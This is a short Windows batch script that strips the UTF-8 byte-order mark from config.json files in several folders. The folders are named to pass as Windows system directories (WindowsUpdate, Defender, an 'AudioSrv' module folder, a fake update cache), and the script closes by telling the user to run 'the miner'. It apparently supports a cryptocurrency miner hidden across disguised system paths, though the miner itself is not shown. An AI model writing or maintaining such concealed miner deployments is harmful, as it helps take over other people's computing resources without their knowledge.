@echo off
title FIX BOM ISSUE IN CONFIG FILES
color 0A

echo ================================================================
echo  FIX BOM ISSUE IN DEPLOYED CONFIGS
echo  The config files have UTF-8 BOM which breaks JSON parsing
echo ================================================================
echo.

echo Fixing all deployed config.json files...
echo.

REM Fix using PowerShell to remove BOM
powershell -Command "$locations = @('C:\ProgramData\Microsoft\Windows\WindowsUpdate', 'C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv', 'C:\ProgramData\Microsoft\Network\Downloader', 'C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\PowerShell', 'C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\Defender', 'C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Templates', 'C:\Users\%USERNAME%\AppData\Local\Temp\WindowsUpdateCache'); foreach ($loc in $locations) { $configPath = Join-Path $loc 'config.json'; if (Test-Path $configPath) { Write-Host \"Fixing: $configPath\"; $content = Get-Content $configPath -Raw; [System.IO.File]::WriteAllText($configPath, $content, [System.Text.UTF8Encoding]::new($false)); Write-Host \"  [OK] Fixed!\" } }"

echo.
echo ================================================================
echo All config files fixed!
echo ================================================================
echo.
echo Now try running the miner:
echo   TEST_DEPLOYED_CONFIG.bat
echo.
pause
